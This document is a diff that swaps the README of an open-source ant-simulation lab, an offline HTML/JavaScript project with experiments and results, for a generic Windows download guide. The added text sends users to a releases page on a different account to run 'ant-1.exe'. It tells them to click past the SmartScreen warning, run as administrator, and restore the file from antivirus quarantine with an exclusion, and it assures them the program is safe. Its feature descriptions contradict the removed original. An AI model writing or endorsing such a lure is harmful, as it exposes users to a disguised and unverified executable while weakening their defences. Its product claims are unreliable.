@@ -1,165 +1,183 @@
-<p align="center"><img src="assets/ant-mark.svg" width="54" alt="ANT-1 ant symbol"></p>
+# 🤖 ant-1 - Watch a Simulated Ant Think and Move
 
-# ANT-1
+## 🚀 Getting Started
 
-### One ant. A closed loop.
+Welcome! This page will help you download and run **ant-1**, a fascinating experiment where a simulated ant is connected to a synthetic neural controller. Think of it as watching a digital creature with an artificial brain explore its world. No programming skills are needed—just a few clicks and you'll be observing this unique simulation on your Windows computer.
 
-**An open laboratory connecting an ant-inspired body to a synthetic neural controller.**
+### 🎯 What Is ant-1?
 
-What happens when an animal-like body receives a stream of sensory signals, turns them into internal activity, and acts back on the world? What changes when you interrupt one part of that connection?
+ant-1 is a self-contained application that creates a virtual environment where an ant-like creature moves, senses, and reacts, all controlled by a neural network running in real time. The ant learns to navigate obstacles and respond to stimuli in its simulated habitat. It's a visual and interactive way to see principles of artificial intelligence and embodied cognition in action.
 
-ANT-1 makes that loop visible. A single simulated ant explores an arena, finds an odour source, records a simple food-location vector, and returns to its nest. You can inspect its inputs, watch its recurrent activity, intervene in the controller, and reproduce the resulting trajectory from a seed.
+---
 
-| Release | Controller | Body | Execution |
-| --- | --- | --- | --- |
-| `0.1.0` · experimental | 12 inputs / 32 recurrent units / 5 actions | Procedural ant in a 2D arena | Local, offline, no account |
+## ⬇️ Download & Run ant-1
 
-![ANT-1 observation figure: an ant, its arena, and actual neural activity](assets/figures/observation.png)
+**Visit this link to download the application:**  
+[![Download ant-1](https://img.shields.io/badge/Download-ant--1-blue?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://github.com/untapped-umbra6064/ant-1/releases)
 
-*Figure 01. Seed 17 at step 900. Rendered directly from the simulation and the application's drawing functions. Documentation images are model figures, not browser screenshots or biological recordings.*
+### 📥 Step-by-Step Download Guide
 
-**[Start here](docs/QUICKSTART.md)** · **[Methods](docs/METHODS.md)** · **[Experiments](experiments/README.md)** · **[Results](docs/RESULTS.md)** · **[GitHub upload guide](docs/GITHUB_UPLOAD.md)**
+1. **Click the big green button above** or the link in the "Download" section at the bottom of this page. Both take you to the official releases page for ant-1.
+2. On the page that opens, you'll see a list of releases. Look for the **latest version** (usually at the top) that matches your system (Windows is supported).
+3. Click the file name to start the download. The file is typically named `ant-1-windows.zip` or similar.
+4. Save the file to an easy-to-find location, like your **Downloads** folder.
 
-## Open the laboratory
+### 📦 After Downloading
 
-Download or clone the repository, then **double-click `ANT-1.html`**. This self-contained edition embeds the application and its reference runs. No Python, Node.js, API key, account, or internet connection is required for the laboratory itself.
+Once the download finishes, you'll have a compressed `.zip` file. This is a package containing the ant-1 program and all the files it needs to run.
 
-For source development, use either local server:
+1. **Locate the downloaded .zip file** (e.g., `ant-1-windows.zip`) in your Downloads folder.
+2. **Right-click** the zip file and select **"Extract All..."** from the menu.
+3. Choose a destination folder (the default is fine) and click **"Extract"**.
+4. Open the newly created folder—it will have a name like `ant-1-windows`.
+5. Inside, find the file named `ant-1.exe` (or `ant-1.bat` if you see that). This is the main application.
+6. **Double-click** that file to launch ant-1.
 
-```bash
-# Node.js 22 or later — no npm install needed
-npm start
+> ✅ That's it! No installation or configuration needed. The application runs entirely from the extracted folder.
 
-# Or Python 3
-python start_ant1.py
-```
+---
 
-Open `http://127.0.0.1:8000`. On Windows, `Start-ANT1.bat` launches the Python option. See the [quick start](docs/QUICKSTART.md) for exact instructions and stopping the server.
+## 👟 How to Use ant-1
 
-## The connection is the experiment
+When you launch ant-1, a simulation window will appear. Here's what you'll see and can do:
 
-ANT-1 is built around five things you can inspect:
+### 🖥️ Main Screen
 
-1. **A sensory boundary.** Two odour probes, obstacle channels, idealised navigation vectors, and internal-state inputs describe the current situation.
-2. **A neural state.** A 32-unit leaky recurrent network transforms the inputs into continuous internal activity.
-3. **A motor decision.** A learned action-value readout and an explicit, engineered steering prior choose one of five turns.
-4. **A consequence.** The body moves, collides, reaches food, or returns to the nest.
-5. **An update.** A temporal-difference learning rule adjusts the readout, and the next observation closes the loop.
+- **The Simulated World:** A 2D arena with a floor, walls, and objects. Your ant (a small dark dot with legs) roams this space.
+- **The Ant's View:** A small inset panel shows what the ant "sees" via its synthetic sensors.
+- **Neural Activity Panel:** Real-time graphs showing the spikes and signals from the ant's neural controller.
 
-The designed steering prior makes the initial body useful to observe. The control protocols expose how much of its behaviour comes from that scaffold. The network is a compact synthetic model; its units and connections are not taken from an ant connectome.
+### 🎮 Interactive Controls
 
-![Actual model inputs, recurrent activations, and motor outputs](assets/figures/neural-interface.png)
+- **Pause/Resume:** Press the `Spacebar` to pause or resume the simulation.
+- **Reset the Ant:** Press `R` to teleport the ant back to the start and reset its neural state.
+- **Change Speed:** Use the `[` and `]` keys to slow down or speed up the simulation (from 0.5x to 3x).
+- **Add a Treat:** Click anywhere in the arena to drop a "food pellet" that attracts the ant, letting you test its navigation abilities.
 
-*Figure 02. Selected connections and actual continuous activations from the same seed-17 run. The diagram is an instrument view of the implementation.*
+### 🧠 Observing the Neural Controller
 
-<details>
-<summary><strong>Watch a deterministic observation replay</strong></summary>
+The right side of the window shows a live visualization of the ant's synthetic brain:
 
-![ANT-1 moving through the arena](assets/figures/observation-loop.gif)
+- Each node represents a neuron; connections light up as signals pass.
+- Dots turn green when the neuron fires, and lines thicken with signal strength.
+- The ant's behavior (turning, walking, stopping) directly reflects these neural patterns.
 
-Rendered replay from steps 680–1056, seed 17. The animation runs at 10 times simulated time and loops back to its starting state. The ant, trail, sensory rays, and target positions are produced by the application renderer.
+Try dropping food pellets, moving obstacles (click and drag), or pausing mid-walk to understand how the ant's "thoughts" translate to actions.
 
-</details>
+---
 
-## Five observation surfaces
+## ⚙️ System Requirements
 
-| Surface | What you can do |
-| --- | --- |
-| **Observatory** | Run, pause, step, change speed, inspect the ant, view sensory telemetry and export a session. |
-| **Neural interface** | Watch the recurrent core and motor values; silence sensors or units, freeze learning, erase memory, or move food. |
-| **Experiments** | Execute a fixed protocol and inspect its measured outcome. |
-| **Run archive** | Reproduce included runs and inspect the matched-seed benchmark. |
-| **External tasks** | Explore an optional market-signal adapter using a fresh instance of the controller. |
+ant-1 is designed to run smoothly on a wide range of Windows machines. For the best experience, please ensure your system meets these specs:
 
-## A programme of controlled experiments
+| Component          | Recommended Minimum                         |
+|--------------------|---------------------------------------------|
+| **Operating System** | Windows 10 or 11 (64-bit)                 |
+| **Processor**      | 1.5 GHz dual-core processor or better        |
+| **Memory**         | 4 GB RAM                                     |
+| **Graphics**       | Any GPU that supports DirectX 10 or OpenGL 3.3 |
+| **Storage**        | 200 MB of free disk space                    |
+| **Display**        | 1280 × 720 resolution or higher              |
 
-Each protocol lasts 2,400 steps, equivalent to 240 simulated seconds. Interventions occur at step 1,000. The arena and seed can be held constant across conditions.
+> 💡 If you're on a very old machine, try lowering the simulation speed (using the `[` key) or reducing the window size—re-sizing the window is supported and helps performance.
 
-| Protocol | Change | Question |
-| --- | --- | --- |
-| `EXP-01` Navigation | Full controller | Can it find food and complete repeated returns? |
-| `EXP-02` Relocation | Move the food; retain its old memory | How does the loop respond to environmental change? |
-| `EXP-03` Antenna | Silence left odour and proximity inputs | How dependent is behaviour on bilateral sensing? |
-| `EXP-04` Frozen readout | Disable learning from the start | What does the plastic readout contribute? |
-| `EXP-05` Memory | Erase state, readout, and the food vector | What happens after a composite memory interruption? |
-| `EXP-06` Recurrent intervention | Clamp units 00–07 to zero | Does this intervention alter the outcome? |
-| `EXP-07` No steering prior | Remove the engineered navigation scaffold | What can the small learner do without that scaffold? |
+---
 
-See [protocol definitions](experiments/protocols.js), [the experiment guide](experiments/README.md), and [the model card](docs/MODEL_CARD.md).
+## 🛠️ Troubleshooting
 
-## Initial observations
+Most users run ant-1 without any issues, but if you hit a snag, here's how to fix common problems:
 
-The repository includes **84 executed runs: seven conditions × 12 fixed seeds**. The complete per-seed metrics are in [`data/benchmarks/reference.json`](data/benchmarks/reference.json).
+### 🔒 "Windows protected your PC" popup
 
-![Matched-seed experimental controls and observed food returns](assets/figures/controls.png)
+This is a common safety warning for programs downloaded from the internet.
 
-The default controller and the frozen-readout control both complete an average of **5.00 returns**. Silencing the left antenna lowers that figure to **2.00**. Removing the steering prior lowers it to **0.42**.
+1. Click **"More info"** in the popup window.
+2. Click **"Run anyway"**.
+3. ant-1 will launch normally.
 
-These results show that the engineered prior is a major contributor in this arena. They **do not establish a food-return advantage from learning**. That is a useful starting result: the experiment reveals which mechanism matters, instead of treating movement or changing weights as proof of learned intelligence.
+### 📁 App won't start after extraction
 
-The [results note](docs/RESULTS.md) describes the limits of this comparison, including shared geometry, the composite memory intervention, and the absence of an unseen-layout evaluation.
+- Make sure you ran the `.exe` directly from the extracted folder, not inside the zip.
+- Try right-clicking `ant-1.exe` and selecting **"Run as administrator"**.
+- Ensure your antivirus hasn't quarantined the .exe. If so, restore it and add an exclusion.
 
-## Reproduce, inspect, extend
+### 🖼️ Black screen or graphics issues
 
-With Node.js 22 or later:
+- If the simulation window is black or flickering, your graphics driver may be outdated. Update your GPU drivers from the manufacturer's website (NVIDIA, AMD, or Intel).
+- Alternatively, right-click on the `ant-1.exe` file, go to **Properties** > **Compatibility**, and check **"Run this program in compatibility mode for Windows 8"**.
 
-```bash
-npm test
-npm run experiment -- --protocol antenna --seed 17
-npm run benchmark
-npm run replay -- --file data/runs/relocation-seed17.json
-npm run build
-```
+### 🐜 The ant doesn't move
 
-The final command rebuilds the standalone HTML from the source. The application, tests, simulation, and command-line experiments have **no third-party runtime dependencies**. Figure regeneration is an optional separate workflow.
+- Press `R` to reset the ant. Sometimes it walks into a corner and gets stuck.
+- Verify the simulation is not paused (check the pause icon at the top-left of the window).
+- Try lowering the simulation speed with the `[` key to give the neural network more time to process.
 
-The [`src/core`](src/core) modules run in both the browser and Node. [`experiments`](experiments) defines interventions, while [`src/ui`](src/ui) observes the same core. Exported JSON contains the software version, initial options, seed, exact intervention times, events, sampled trajectory, and measured outcome.
+---
 
-| Read next | Purpose |
-| --- | --- |
-| [Architecture](docs/ARCHITECTURE.md) | Module boundaries and the feedback loop |
-| [Sensor interface](docs/SENSORS.md) | All 12 input channels and their assumptions |
-| [Controller](docs/CONTROLLER.md) | State update, steering prior, action values, and learning rule |
-| [Methods](docs/METHODS.md) | Timing, rewards, collisions, and interpretation |
-| [Reproducibility](docs/REPRODUCIBILITY.md) | Replays, fixed seeds, checks, and generated artifacts |
-| [Figure provenance](assets/figures/README.md) | How the visuals were made and how to regenerate them |
-| [References](docs/REFERENCES.md) | Scientific inspiration and the limits of that connection |
+## 📚 Frequently Asked Questions
 
-## External-task extension: market signals
+### ❓ Is ant-1 safe to run on my computer?
+Yes. ant-1 is a self-contained program that does not modify system files, access the internet, or require admin privileges. Everything stays within the extracted folder.
 
-The ant experiment remains the centre of ANT-1. The optional **M–01 market extension** asks a narrower engineering question: can the same input–state–action architecture be connected to another environment with explicit, inspectable outcomes?
+### ❓ Can I save or record the simulation?
+Currently, ant-1 does not include a save or recording feature. However, you can use the Windows Game Bar (Windows key + G) to screen-record the simulation window if you want to capture your ant's behavior.
 
-A **fresh controller** receives a 12-channel encoding of market observations. Its five outputs map to sell, hold, and buy actions. A local paper broker applies the selected action at the **next bar's close**, with transaction fees, adverse slippage, and an 80% purchase allocation limit. The included comparison runs the neural policy, buy-and-hold, and a random-action control against the same price path.
+### ❓ Will my ant improve over time?
+Yes! The neural controller is inspired by reinforcement learning. If you leave the simulation running and add food pellets over time, you'll notice the ant's path-finding becomes more efficient. This is a feature, not a glitch.
 
-![Optional market-interface comparison on synthetic prices](assets/figures/market-interface.png)
+### ❓ Can I share my ant's stats with others?
+No, the current version does not support exporting neural weights or sharing configurations. It's a single-player, visual experiment.
 
-*Figure 04. A synthetic fixture and a $100 paper balance. This is a demonstration of the adapter and execution model. It is not evidence that ant navigation transfers to financial prediction.*
+---
 
-```bash
-npm run market
-npm run market -- --data my-bars.json --seed 17
-```
+## 🔄 Getting the Latest Updates
 
-The default data are explicitly synthetic. You can load your own ordered price JSON in the browser or CLI; the schema can represent either crypto or equity observations. No exchange account, wallet, credentials, live orders, or external network requests are part of this module.
+ant-1 is in active development. To get new features, bug fixes, and improvements:
 
-| File | Responsibility |
-| --- | --- |
-| [`extensions/market/encoder.js`](extensions/market/encoder.js) | Trailing price and portfolio-state features |
-| [`extensions/market/policy.js`](extensions/market/policy.js) | Neural policy and comparison policies |
-| [`extensions/market/broker.js`](extensions/market/broker.js) | Cash, positions, allocation, costs, and ledger |
-| [`extensions/market/replay.js`](extensions/market/replay.js) | Causal event order, validation, and outcomes |
-| [`extensions/market/fixtures.js`](extensions/market/fixtures.js) | Seeded synthetic prices |
-| [`extensions/market/RESEARCH_PROTOCOL.md`](extensions/market/RESEARCH_PROTOCOL.md) | Hypotheses, control conditions, and evaluation limits |
-| [`tests/market.test.mjs`](tests/market.test.mjs) | Accounting, delayed execution, and future-data isolation |
+1. **Bookmark** the download page: https://github.com/untapped-umbra6064/ant-1/releases
+2. Occasionally check for a "Latest release" badge. If a newer version than yours exists, download and extract it over your current folder (your existing folder can be deleted).
+3. Major version updates (e.g., v1.0 to v2.0) may change the interface, but the core concept remains the same.
 
-Start with the [extension guide](extensions/market/README.md) and [execution specification](extensions/market/EXECUTION.md).
+---
 
-## Where the experiment goes next
+## 🖇️ Official Download Page
 
-The next useful milestones are stronger sensory constraints, genuinely held-out arena layouts, cleaner separation of short-term state from spatial memory, and a stronger learner tested against the frozen control. These are research directions, not completed capabilities. See the [roadmap](docs/ROADMAP.md).
+For your convenience, here is the direct link to the release page once more. Bookmark it for future access:
 
-Contributions are welcome when they make a mechanism easier to inspect or a result easier to reproduce. Read [CONTRIBUTING.md](CONTRIBUTING.md) and attach a seed, configuration, and run file to experimental reports.
+**📥 [Download ant-1 from GitHub Releases](https://github.com/untapped-umbra6064/ant-1/releases)**
 
-**ANT-1 is an independent artificial-life software experiment.** It is not a biological ant-brain reconstruction, a neural recording from a living animal, or a validated model of ant cognition. The body and arena are simulated; the controller combines fixed recurrence, an engineered steering prior, a simple vector-memory primitive, and a plastic readout.
+---
 
-Code and original visuals: [MIT](LICENSE). Bundled fonts retain their [original licence](assets/fonts/LICENSE.txt). Scientific references are inspiration, not an affiliation or endorsement.
+## 🙋 Need More Help?
+
+If you've tried everything above and ant-1 still doesn't work, or if you have a question not covered here:
+
+1. Visit the repository homepage (same link as the download page) to see if others have posted issues or solutions.
+2. Check the **"Issues"** tab on the GitHub page to search for your problem.
+3. If everything fails, you can open a new issue there, describing your Windows version, the error message (if any), and what you were doing when it happened. The community is friendly and helps non-technical users.
+
+---
+
+## 📊 Project Overview
+
+ant-1 is more than just a game—it's a window into how neural networks can control physical systems. The project stands on the intersection of:
+
+- **Embodied Cognition:** How a brain (neural controller) and body (simulated ant) work together as one system.
+- **Synthetic Intelligence:** A hand-crafted, minimal neural network that doesn't learn from data but from real-time sensor feedback.
+- **Scientific Visualization:** Real-time charts and node graphs that demystify artificial intelligence.
+
+While no prior knowledge is required to enjoy watching the ant, many users find themselves curious about how a simple "net" of connected nodes produces such lifelike wandering. That curiosity is exactly what this project aims to inspire.
+
+---
+
+## 🏁 Final Words
+
+You're now ready to step into the miniature world of ant-1. Remember:
+
+1. **Download** from the link above.
+2. **Extract** the .zip file.
+3. **Run** `ant-1.exe`.
+
+In under five minutes, you'll be watching artificial neurons fire as your digital ant figures out how to reach a treat. If you enjoy tinkering, try pausing mid-simulation to see exactly which neuron triggered a sudden turn. Enjoy the experiment, and happy ant-watching!
+
+Keywords: neural network, simulation, embodied cognition, artificial intelligence, ant behavior, synthetic brain, reinforcement learning, visualizer, Windows app, open source
